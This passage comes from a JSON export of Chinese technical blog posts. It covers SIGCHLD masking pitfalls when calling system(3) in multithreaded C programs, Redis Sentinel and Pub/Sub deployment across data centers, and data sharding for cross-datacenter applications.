#66cccc;\">'\\0'</span>, output_size);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fread(output, output_size - 1, 1, p);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   pclose(p);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> 0;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> -1;\n}\n</pre>\n</div>\n\n<p>\n使用示例\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-C\"><span style=\"color: #6699cc;\">char</span> <span style=\"color: #ffcc66;\">output</span>[255];\n<span style=\"color: #99cc99;\">if</span> (0 == system2(<span style=\"color: #66cccc;\">\"mkdir /test; echo ret=$?\"</span>, output, <span style=\"color: #99cc99;\">sizeof</span>(output)) &amp;&amp; strstr(o<span style=\"text-decoration: underline;\">utput, </span><span style=\"color: #66cccc; text-decoration: underline;\">\"ret=0\"</span><span style=\"text-decoration: underline;\">)) {</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   printf(<span style=\"color: #66cccc;\">\"mkdir /test successed\"</span>);\n} <span style=\"color: #99cc99;\">else</span> {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   printf(<span style=\"color: #66cccc;\">\"mkdir /test failed\"</span>);\n}\n</pre>\n</div>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">在整个应用中阻塞 SIGCHLD 信号可能导致出现僵尸进程</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\nsignal(3) 无法阻塞一个信号，只支持忽略（SIG_IGN）和恢复缺省处理（SIG_DFL）。\n</p>\n\n<p>\n阻塞（ SIG_BLOCK）和取消阻塞（SIG_UNBLOCK）用于信号掩码（Signal Mask），如 sigprocmask(3) ，多线程下请使用 pthread_sigmask(3)。\n</p>\n\n<p>\n主线程在创建子线程之前阻塞 SIGCHLD 信号\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\"><span style=\"color: #6699cc;\">sigset_t</span> <span style=\"color: #ffcc66;\">set</span>;\nsigemptyset(&amp;set);\nsigaddset(&amp;set, SIGCHLD);\npthread_sigmask(SIG_BLOCK, &amp;set, <span style=\"color: #6699cc;\">NULL</span>);\n</pre>\n</div>\n\n<p>\n通过继承主线程的信号处理，子线程调用 system(3) 创建子进程时能够保证其中的 waitpid(3) 调用成功获取子进程的退出码。\n</p>\n\n<p>\nman signal(7)\n</p>\n<blockquote>\n<p>\n通过 fork(2) 创建的子进程继承父进程的信号掩码，该信号掩码即使在 execve(2) 后仍得以保留。\n</p>\n\n<p>\nA child created via fork(2) inherits a copy of its parent's signal mask; the signal mask is preserved across execve(2).\n</p>\n</blockquote>\n\n<p>\nsystem(3) 在替换进程为新程序（execl(3)）之前，会重置为保存的信号掩码，也就是阻塞 SIGCHLD 信号状态，子进程继承这一掩码可能会产生问题。\n</p>\n</div>\n\n<div id=\"outline-container-sec-2-1\" class=\"outline-3\">\n<h3 id=\"sec-2-1\">在整个应用中阻塞 SIGCHLD 信号会导致一种常用的回收僵尸进程的方法失效</h3>\n<div class=\"outline-text-3\" id=\"text-2-1\">\n<p>\n<a href=\"http://www.microhowto.info/howto/reap_zombie_processes_using_a_sigchld_handler.html\">Reap zombie processes using a SIGCHLD handler</a> 有详细描述\n</p>\n\n<blockquote>\n<p>\nThe method described here has two steps:\n</p>\n\n<ol class=\"org-ol\">\n<li>Define a handler for SIGCHLD that calls waitpid.\n</li>\n\n<li>Register the SIGCHLD handler.\n</li>\n</ol>\n</blockquote>\n\n<p>\n这种回收僵尸进程的方法不但我们自已不能使用，并且我们调用的子进程也不能使用，除非子进程聪明到先清除 SIGCHLD 信号掩码。\n</p>\n\n<p>\n相关 BUG 报告\n<a href=\"https://bugzilla.mindrot.org/show_bug.cgi?id=271\">271 – SSHD should unblock SIGCHLD - POSIX signal blocks survive exec()</a>\n</p>\n\n<p>\n通过 system(3) 启动 sshd，有用户尝试登录，sshd 会再 fork(3) 一个孙进程，然后在 SIGCHLD 信号处理函数中通过 waitpid(3) 回收孙进程，但是从父进程（调用 system(3)的进程）继承而来信号掩码阻塞了 SIGCHLD 信号，导致孙进程结束后成为僵尸进程。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2-2\" class=\"outline-3\">\n<h3 id=\"sec-2-2\">在调用 system(3) 前暂时取消对 SIGCHLD 的阻塞</h3>\n<div class=\"outline-text-3\" id=\"text-2-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-C\"><span style=\"color: #999999; font-style: italic;\">// </span><span style=\"color: #999999; font-style: italic;\">&#23553;&#35013; system(3) &#65292;&#19968;&#26041;&#38754;&#36991;&#20813;&#20013;&#26029;&#31995;&#32479;&#35843;&#29992;&#65292;&#21478;&#19968;&#26041;&#38754;&#36991;&#20813;&#20986;&#29616;&#20725;&#23608;&#23385;&#36827;&#31243;.</span>\n<span style=\"color: #999999; font-style: italic;\">// </span><span style=\"color: #999999; font-style: italic;\">&#35831;&#35760;&#24471;&#20840;&#23616;&#22581;&#22622; SIGCHLD &#20449;&#21495;.</span>\n<span style=\"color: #6699cc;\">int</span> <span style=\"color: #f99157;\">system2</span>(<span style=\"color: #99cc99;\">const</span> <span style=\"color: #6699cc;\">char</span>* <span style=\"color: #ffcc66;\">command</span>)\n{\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">// </span><span style=\"color: #999999; font-style: italic;\">&#35843;&#29992; system(3) &#21069;&#21462;&#28040;&#23545; SIGCHLD &#30340;&#38459;&#22622;</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">sigset_t</span> <span style=\"color: #ffcc66;\">set</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   sigemptyset(&amp;set);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   sigaddset(&amp;set, SIGCHLD);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   pthread_sigmask(SIG_UNBLOCK, &amp;set, <span style=\"color: #6699cc;\">NULL</span>);\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">code</span> = system(command);\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">// </span><span style=\"color: #999999; font-style: italic;\">&#35843;&#29992; system(3) &#21518;&#24674;&#22797;&#23545; SIGCHLD &#30340;&#38459;&#22622;</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   sigemptyset(&amp;set);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   sigaddset(&amp;set, SIGCHLD);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   pthread_sigmask(SIG_BLOCK, &amp;set, <span style=\"color: #6699cc;\">NULL</span>);\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> code;\n}\n</pre>\n</div>\n\n<p>\n在调用 system(3) 前暂时取消对 SIGCHLD 的阻塞，使子进程继承到正确的信号掩码，调用返回后恢复对 SIGCHLD 的阻塞，可以解决这个问题。\n</p>\n\n<p>\n另外还有 popen(3)/pclose(3) 也可以用来创建子进程，也要相应进行替换。\n</p>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<ul class=\"org-ul\">\n<li><a href=\"http://www.linuxprogrammingblog.com/all-about-linux-signals?page=show\">All about Linux signals | Linux Programming Blog</a>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li><a href=\"https://www.win.tue.nl/~aeb/linux/lk/lk-5.html\">The Linux kernel: Signals</a>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li><a href=\"http://www.oschina.net/question/54100_30293\">Linux下调用system()函数导致的问题 - 开源中国社区</a>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "Redis Sentinel 多机房部署注意事项",
  "timestamp": "2016-08-15 15:03:00",
  "tags": [
    "redis"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">级连同步失效</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n级连同步的描述（摘自 <a href=\"http://redis.io/topics/replication\">Replication – Redis</a>）：\n</p>\n<blockquote>\n<p>\nSlaves are able to accept connections from other slaves. Aside from connecting a\nnumber of slaves to the same master, slaves can also be connected to other slaves in\na cascading-like structure.\n</p>\n</blockquote>\n\n<p>\n由此可见级连同步可减轻 Master 的流量。\n</p>\n\n<p>\n假设 DataCenter 2 上的两个 Slave 从 DataCenter 1 上的 Master 进行同步，会导致 DataCenter 1 要流出两份流量到 DataCenter 2，开启级连同步（DataCenter 2 上的其中一个 Slave 从另一个 Slave 上进行同步）后，DataCenter 1 只需同步一份流量到 DataCenter2。\n</p>\n\n<p>\nSentinel 以星状组织 Redis 结点，无法发现二级 Slave（Slave 上连接的其它 Slave），也就无法将二级 Slave 信息提供给客户端应用进行访问，应用需要自行连上二级 Slave。另外，一级 Slave 被 Sentinel 切为 Master 后，二级 Slave 将转化为一级 Slave ，从而被 Sentinel 发现。\n</p>\n\n\n<div class=\"figure\">\n<p><img src=\"../static/redis-sentinel_slave_of_slave.png\" alt=\"redis-sentinel_slave_of_slave.png\" />\n</p>\n</div>\n\n<p>\n当 Fail-Over 发生后级连同步会失效，Redis Sentinel 不支持级连同步\n</p>\n<blockquote>\n<p>\nAside from this problems, there is also the problem that for Sentinel\nthe role of an instance is the one published in INFO by the instance.\nThis means that you can't failover a slave that happens to be the\nmaster of other chained instances. Also the chained instances will not\nbe detected, and if detected because of a temporary role change for\nsome reason, they'll be reconfigured to replicate with what Sentinel\nbelieve to be the master.\nBasically you can find your ways to make it working but currently the\nsupport for chained replication in Sentinel is near zero.\n</p>\n\n<p>\nSalvatore \n</p>\n</blockquote>\n<p>\n引用自 <a href=\"https://groups.google.com/d/msg/redis-db/uMOIX3m3Is4/HWhYegU4OawJ\">Sentinels in Multi Region configuration - Google 网上论坛</a>\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">内网流量外网化</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n跨机房部署就意味着需要跨机房同步或访问 Redis 数据，如果另一机房有多个 Slave，则会有多份流量，机房外网流量会相应增长，需要预先进行流量规划。\n</p>\n\n\n<p>\nRedis 为内网部署提供了如下配置项\n</p>\n\n<ul class=\"org-ul\">\n<li>Sentinel 的 announce-ip 和 announce-port 选项\n\n<p>\n要求 Redis 版本至少为 2.8，参见 <a href=\"https://raw.githubusercontent.com/antirez/redis/2.8/redis.conf\">redis.conf</a>\n</p>\n</li>\n\n<li>Redis 的 slave-announce-ip 和 slave-announce-port 选项\n\n<p>\n要求 Redis 版本至少为 3.2，参见 <a href=\"https://raw.githubusercontent.com/antirez/redis/3.2/redis.conf\">redis.conf</a>\n</p>\n</li>\n</ul>\n\n<p>\n它们用于解决如下两个问题\n</p>\n<blockquote>\n<p>\nRemapping ports and addresses creates issues with Sentinel in two ways:\n</p>\n\n<ol class=\"org-ol\">\n<li>Sentinel auto-discovery of other Sentinels no longer works, since it is based on \nhello messages where each Sentinel announce at which port and IP address they are\nlistening for connection. However Sentinels have no way to understand that an address\nor port is remapped, so it is announcing an information that is not correct for other\nSentinels to connect.\n</li>\n<li>Slaves are listed in the INFO output of a Redis master in a similar way: the address\nis detected by the master checking the remote peer of the TCP connection, while the\nport is advertised by the slave itself during the handshake, however the port may be\nwrong for the same reason as exposed in point 1.\n</li>\n</ol>\n</blockquote>\n<p>\n引用自 <a href=\"http://redis.io/topics/sentinel#sentinel-docker-nat-and-possible-issues\">Redis Sentinel Documentation – Redis - Sentinel, Docker, NAT, and possible issues</a>\n</p>\n\n\n<p>\n基于 Sentinel 的集群系统中，Redis 实例（角色可能为 Master、Slave 或 Sentinel）是通过 IP 和 PORT 标识的。\n</p>\n\n<ul class=\"org-ul\">\n<li>Master\n\n<p>\n自身监听的 IP 和 PORT 并不重要，只要 Slave 和 Sentinel 能够连上即可，所以往往在所有 IP 上进行监听。\n</p>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>Slave\n\n<p>\nSlave 配置中指定的 Master 结点 IP 是关键所在。\n</p>\n\n<p>\nSlave 建立到 Master 的 TCP 连接时，Master 获取到的对端 IP 和 PORT 标识该 Slave，在 Master 的 INFO 命令中体现。\n</p>\n\n<p>\nSlave 连接的 Master IP，经由路由规则，也就决定了 Master 看到的是 Slave 的哪一个 IP。\n</p>\n\n<p>\n可以通过 slave-announce-ip 和 slave-announce-port 配置项强制指定。\n</p>\n</li>\n\n<li>Sentinel\n\n<p>\nSentinel 配置中指定的 Master 结点 IP 是关键所在。\n</p>\n\n<p>\nSentinel 建立到 Master 的 TCP 连接后，调用 <code>getsockname</code> 从 fd 中取得本地 IP，PORT 则为配置的监听端口，并通过 PUBLISH Hello 消息告知其它 Sentinel。\n</p>\n\n<p>\nSentinel 连接的 Master IP，经由路由规则，也就决定了 Sentinel 看到的自身 IP。\n</p>\n\n<p>\n可以通过 announce-ip 和 announce-port 配置项强制指定。\n</p>\n</li>\n</ul>\n\n<p>\nDataCenter 2 上部署的应用会通过 Sentinel 获取到 DataCenter 1 上的结点（角色可能为 Master、Slave 或 Sentinel）信息，然后连接、访问，所以 Redis 实例（角色可能为 Master、Slave 或 Sentinel）都至少需要监听外网 IP。\n</p>\n\n<p>\n通过外网 IP 访问同机房内结点，不会导致流量外网化，上级交换机识别到目标 IP 就在网络内，走的还是内网。\n</p>\n\n<p>\n应用程序从 Sentinel 获取 Slave 列表后，最好优先连接同一数据中心的 Slave 结点。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">相关资源</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<ul class=\"org-ul\">\n<li><a href=\"http://redis.io/topics/sentinel\">Redis Sentinel Documentation – Redis</a>\n</li>\n\n<li><a href=\"https://groups.google.com/forum/#!searchin/redis-db/data$20center|sort:relevance/redis-db/o5afhx9Zn5E/DwQU3JLJJKgJ\">Replication for read-scalability - Google 网上论坛</a>\n\n<p>\n通过公网跨数据中心复制数据相关的问题：安全、迟延等\n</p>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li><a href=\"https://groups.google.com/d/msg/redis-db/uMOIX3m3Is4/HWhYegU4OawJ\">Sentinels in Multi Region configuration - Google 网上论坛</a>\n\n<p>\nRedis Sentinel 多数据中心配置问题\n</p>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li><a href=\"https://redislabs.com/ebook/redis-in-action/part-3-next-steps-3/chapter-10-scaling-redis/10-1-scaling-reads\">Redis in Action - Scaling reads</a>\n\n<p>\nRedis 压缩、安全传输相关</p>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "Redis Pub/Sub 多机房部署",
  "timestamp": "2016-08-18 14:18:00",
  "tags": [
    "redis"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">由于 Master 上 Publish 的消息会自动同步到所有 Slaves，Redis Pub/Sub 很容易扩展</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<blockquote>\n<p>\nRedis PubSub scales really easily since the Master/Slave replication automatically publishes to all slaves.\n</p>\n</blockquote>\n<p>\n引用自 <a href=\"http://stackoverflow.com/a/6512308/802708\">Redis PUBLISH/SUBSCRIBE limits - Stack Overflow</a>\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">可以在 Master 上 Publish 消息，然后在 Slave 上 Subscribe 消息，反之不行</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<blockquote>\n<p>\nWith replication in-place the  publisher can publish in the master host and the subscribers can subscribe to the slave host.\n</p>\n\n<p>\nIt is important to mention that this relationship is one-way. Master –&gt; Slave relationship are unidirectional. It is impossible to publish to the slave and subscribe to the master.\n</p>\n\n<p>\n&#x2026;\n</p>\n\n<p>\nThe conclusion is simple: Two ways pub/sub channels across servers require at least 4 Redis hosts.\n</p>\n</blockquote>\n<p>\n引用自 <a href=\"http://blogs.microsoft.co.il/applisec/2013/09/11/pub-sub-across-servers-using-redis/\">Pub Sub Across Servers Using Redis | Manu Cohen-Yashar's Blog</a>\n</p>\n\n<p>\n需要注意的是，Slave 虽然不可写（Readonly），但是照样可以 Pub/Sub，\n只是 Publish 的消息不会同步到 Master，所以不会被 Master 上的 Subscriber 接收到，\n但是 Slave 自身的 Subscriber 仍工作正常。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">多机房部署的情况下，2 个 Redis 实例可实现双向通讯</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n<img src=\"../static/redis-pub_sub_multi_datacenter-2.png\" alt=\"redis-pub_sub_multi_datacenter-2.png\" />\n但是比较低效，Master 所在机房 Publish 的消息会在机房间传输一次（Sync 一次），\nSlave 所在机房 Publish 的消息会在机房间传输两次（Send、Sync 各一次），\n而且 Slave 机房部署的应用需要跨机房直接连接到 Master 才能进行 Publish。\n</p>\n</div>\n</div>\n\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">多机房部署的情况下，4 个 Redis 实例可以实现高效的双向通讯</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n<img src=\"../static/redis-pub_sub_multi_datacenter-4.png\" alt=\"redis-pub_sub_multi_datacenter-4.png\" />\n每一次 Publish 的消息会在机房间传输一次，机房间只有 Master/Slave 同步流量。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">Pub/Sub 跨机房部署带来的问题</h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n</div><div id=\"outline-container-sec-5-1\" class=\"outline-3\">\n<h3 id=\"sec-5-1\">从 Slave Subscribe 消息后，消息 Publish 一方无法获知 Subscriber 数量</h3>\n<div class=\"outline-text-3\" id=\"text-5-1\">\n<pre class=\"example\">\n<span class=\"linenr\"> 1: </span># Publish to master, subscribe from master.\n<span class=\"linenr\"> 2: </span>$ redis-cli -h master.local subscribe test &amp;\n<span class=\"linenr\"> 3: </span>[1] 20590\n<span class=\"linenr\"> 4: </span>$ Reading messages... (press Ctrl-C to quit)\n<span class=\"linenr\"> 5: </span>1) \"subscribe\"\n<span class=\"linenr\"> 6: </span>2) \"test\"\n<span class=\"linenr\"> 7: </span>3) (integer) 1\n<span class=\"linenr\"> 8: </span>$ \n<span class=\"linenr\"> 9: </span>$ redis-cli -h master.local  publish test \"hello from master\"\n<span class=\"linenr\">10: </span>1) \"message\"\n<span class=\"linenr\">11: </span>2) \"test\"\n<span class=\"linenr\">12: </span>3) \"hello from master\"\n<span id=\"coderef-subscribers_on_master_perceptible\" class=\"coderef-off\"><span class=\"linenr\">13: </span>(integer) 1</span>\n<span class=\"linenr\">14: </span>$ fg\n<span class=\"linenr\">15: </span>redis-cli subscribe test\n<span class=\"linenr\">16: </span>  C-c C-c\n<span class=\"linenr\">17: </span>$ \n<span class=\"linenr\">18: </span># Publish to master, subscribe from slave.\n<span class=\"linenr\">19: </span>$ redis-cli -h slave.local -p 6380 subscribe test &amp;\n<span class=\"linenr\">20: </span>[1] 20592\n<span class=\"linenr\">21: </span>$ Reading messages... (press Ctrl-C to quit)\n<span class=\"linenr\">22: </span>1) \"subscribe\"\n<span class=\"linenr\">23: </span>2) \"test\"\n<span class=\"linenr\">24: </span>3) (integer) 1\n<span class=\"linenr\">25: </span>$ \n<span class=\"linenr\">26: </span>$ redis-cli -h master.local publish test \"hello from master\"\n<span id=\"coderef-subscribers_on_slave_nonperceptible\" class=\"coderef-off\"><span class=\"linenr\">27: </span>(integer) 0</span>\n<span class=\"linenr\">28: </span>1) \"message\"\n<span class=\"linenr\">29: </span>2) \"test\"\n<span class=\"linenr\">30: </span>3) \"hello from master\"\n<span class=\"linenr\">31: </span>$\n</pre>\n\n<ul class=\"org-ul\">\n<li>行 <a href=\"#coderef-subscribers_on_master_perceptible\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-subscribers_on_master_perceptible');\" onmouseout=\"CodeHighlightOff(this, 'coderef-subscribers_on_master_perceptible');\">13</a>\n\n<p>\n在 Master 上订阅时，发布方得知的订阅者人数为 1\n</p>\n</li>\n\n<li>行 <a href=\"#coderef-subscribers_on_slave_nonperceptible\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-subscribers_on_slave_nonperceptible');\" onmouseout=\"CodeHighlightOff(this, 'coderef-subscribers_on_slave_nonperceptible');\">27</a>\n\n<p>\n在 Slave 上订阅时，发布方得知的订阅者人数为 0</p>\n</li>\n</ul>\n</div>\n</div>\n</div>\n"
},
{
  "title": "Redis Sentinel 多机房部署方案",
  "timestamp": "2016-08-20 22:20:00",
  "tags": [
    "redis"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">减少或避免跨机房 Redis 访问的好处</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>减少跨机房网络流量\n\n<p>\n很多机房外网流量是有限制的，外网流量过高会影响整个服务的稳定性，甚至拒绝服务。\n</p>\n</li>\n\n<li>更快的响应速度\n\n<p>\n跨机房网络传输的网络延时很高。\n</p>\n</li>\n\n<li>更安全\n\n<p>\nRedis 本身的安全机制很薄弱，目前只支持明文密码验证，依靠 iptables 进行访问限制，运维成本高。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">如何减少或避免应用的跨机房访问</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n</div><div id=\"outline-container-sec-2-1\" class=\"outline-3\">\n<h3 id=\"sec-2-1\">单维的数据模型</h3>\n<div class=\"outline-text-3\" id=\"text-2-1\">\n<p>\n如果整个应用的数据集是单维度的，即基于同一主键，按主键进行数据分片（Sharding）后，同一主键所属的数据会处于同一分片（Shard），按主键访问时是无共享（shared-nothing）的，可以水平无限扩容。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2-2\" class=\"outline-3\">\n<h3 id=\"sec-2-2\">多维的数据模型</h3>\n<div class=\"outline-text-3\" id=\"text-2-2\">\n<p>\n如果整个应用的数据集是多维度的，按一个维度进行数据分片（Sharding）后，按另一维度获取数据时，需要同时访问多个分片（Shard）。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2-3\" class=\"outline-3\">\n<h3 id=\"sec-2-3\">以博客应用为例</h3>\n<div class=\"outline-text-3\" id=\"text-2-3\">\n<p>\n文章的模型定义如下\n</p>\n\n<table border=\"2\" cellspacing=\"0\" cellpadding=\"6\" rules=\"groups\" frame=\"hsides\">\n\n\n<colgroup>\n<col  class=\"left\" />\n\n<col  class=\"left\" />\n</colgroup>\n<thead>\n<tr>\n<th scope=\"col\" class=\"left\">Field</th>\n<th scope=\"col\" class=\"left\">Type</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td class=\"left\">id</td>\n<td class=\"left\">Number</td>\n</tr>\n\n<tr>\n<td class=\"left\">title</td>\n<td class=\"left\">String</td>\n</tr>\n\n<tr>\n<td class=\"left\">author</td>\n<td class=\"left\">Number</td>\n</tr>\n\n<tr>\n<td class=\"left\">content</td>\n<td class=\"left\">String</td>\n</tr>\n</tbody>\n</table>\n\n<p>\n按 id 进行数据分片（Sharding），id 为寄数保存到 Shard 1，id 为 偶数保存到 Shard 2，\n按 id 访问文章时，计算 id 对应的分片（Shard），从分片获得文章数据。\n还可以在模型中添加冗余字段（如：author_name），方便显示作者名称，省去一次关联查询。\n</p>\n\n\n<p>\n要获取 author 的文章列表，则需要在文章发布时按 author 索引文章，模型定义如下\n</p>\n\n<table border=\"2\" cellspacing=\"0\" cellpadding=\"6\" rules=\"groups\" frame=\"hsides\">\n\n\n<colgroup>\n<col  class=\"left\" />\n\n<col  class=\"left\" />\n</colgroup>\n<thead>\n<tr>\n<th scope=\"col\" class=\"left\">Field</th>\n<th scope=\"col\" class=\"left\">Type</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td class=\"left\">id</td>\n<td class=\"left\">Number</td>\n</tr>\n\n<tr>\n<td class=\"left\">name</td>\n<td class=\"left\">String</td>\n</tr>\n\n<tr>\n<td class=\"left\">articles</td>\n<td class=\"left\">Set</td>\n</tr>\n</tbody>\n</table>\n\n<p>\n按 id 进行数据分片（Sharding），id 为寄数保存到 Shard 1，id 为 偶数保存到 Shard 2，\n按 id 访问作者时，计算 id 对应的分片（Shard），从分片获得作者数据。\n</p>\n\n\n<p>\n当应用逻辑很简单的时候（如：根据文章 id 展示文章、展示作者的文章列表），结合冗余字段，我们可以做到只从一个数据分区（Shard）中取得数据。但是发表文章时，则一定要同时更新多个分区（Shard）中的数据。\n</p>\n\n\n<p>\n我们之所以如此介意跨分区（Shard）数据访问，是因为有可能两个分区（Shard）相隔甚远（如：部署在横跨大陆的多个数据中心），更高的延迟、费用，更低的稳定性，同时也会引入分布式系统带来的复杂性。\n</p>\n\n<p>\n现实中有价值的应用服务，往往比较复杂，都是多维的数据模型，跨分区（机房）数据访问避无可避。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2-4\" class=\"outline-3\">\n<h3 id=\"sec-2-4\">跨机房交互形式</h3>\n<div class=\"outline-text-3\" id=\"text-2-4\">\n<ul class=\"org-ul\">\n<li>管它跨不跨机房\n\n<p>\n一开始应用可能是部署在一个机房里，随着规模的扩大或者需要满足异地灾备，将一部分模块移到另一个机房，模块间的交互从内网移到了外网。以前在内网的时候，网络传输是很快的，设计的接口粒度很细，迁移到外网跨机房环境下，性能以及稳定性可能会无法接受，最终要不断地进行优化。\n</p>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>重定向客户端请求到数据所属的机房\n\n<p>\n如通过 HTTP 302 指示客户端（通常是浏览器）跳转到数据所属机房的域名（或 IP）。\n会增加客户端开发的复杂性，很多逻辑需要放在客户端来完成，能够将机房外网流量尽量减少。\n</p>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>代客户端进行跨机房请求\n\n<p>\n如代理发起 HTTP 请求（或内部通信机制，如：消息队列）到所属机房的域名（或 IP），并转发响应给客户端。\n会增加后台应用开发的复杂性，如果应用有内置的内部通信机制（如：消息队列）复杂性还是可以接受的，会增加机房的外网流量，只能算是一种过渡方案。\n</p>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>支持跨机房访问但引导客户端访问正确的数据中心\n\n<p>\n用户请求涉及的部分数据如果在另一机房，则直接跨机房访问，如同数据在本机房一样进行处理，并在响应中指示客户端下次到另一机房进行访问。后台应用和客户端的开发不会过度复杂，通过引导客户端访问正确的数据中心进行优化。\n</p>\n</li>\n</ul>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">协调访问数据分片</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n假设数据按照主键的 hash 值进行取模分片（Sharding），数据与分片（Shard）的对应关系对应如下：\n</p>\n\n<pre class=\"example\">\nshard = hash(key) % count(shards)\n</pre>\n\n\n<p>\n多机房下的数据分片（Sharding）需具备以下特性：\n</p>\n\n<ol class=\"org-ol\">\n<li>数据片（Shard）一定会处于某一机房，但不可同时处于多个机房\n</li>\n\n<li>数据片（Shard）所属机房如果挂了，其它机房的复本之一会被激活，数据片（Shard）重新可用\n</li>\n\n<li>除非所有机房都挂了，否则数据应该总是可用的（Availability）\n</li>\n</ol>\n\n<p>\n以上三点可由 Redis Sentinel 保证。\n</p>\n\n<p>\nRedis Sentinel 以星状组织 Redis 结点拓扑，对于多数据中心部署的 Redis 集群，结点超过 2 个时可能会导致机房间流量暴涨（如：需要从一个机房的 Master 同步多份数据到另一个机房的多个 Slave）。\n所以，最好把数据集切分得更细一些，直到一组 Redis 实例（即 1 Master + 1 Slave）即可容纳并可满足客户端请求。\n</p>\n\n<p>\n直接访问 Redis 往往是耦合度很高的一种形式，Redis 中的数据是所有服务结点共享访问的，访问冲突和状态不一致可能会导致业务出错。\n</p>\n\n<p>\n我们希望机房间除了 Redis 的 Master-Slave 间的数据同步之外不再有其它的交互，最好不要有应用（Application）跨机房操作 Redis 以实现业务逻辑的情况发生。\n</p>\n\n\n<div class=\"figure\">\n<p><img src=\"../static/redis-restrict_cross_datacenter_flow.png\" alt=\"redis-restrict_cross_datacenter_flow.png\" />\n</p>\n</div>\n\n<p>\n如何在限制跨机房 Redis 访问的情况下实现业务逻辑呢？\n</p>\n\n<ul class=\"org-ul\">\n<li>重定向客户端请求到数据所属的机房\n\n<p>\n后端服务结点知道哪个数据中心更适合处理用户的请求，向客户端发出重定向指示即可，不需要耗费其它资源。\n</p>\n</li>\n\n<li>通过跨机房交互满足客户端请求\n\n<p>\n完成请求需要与另一机房的服务交互，如通过调用服务接口（如：Restful 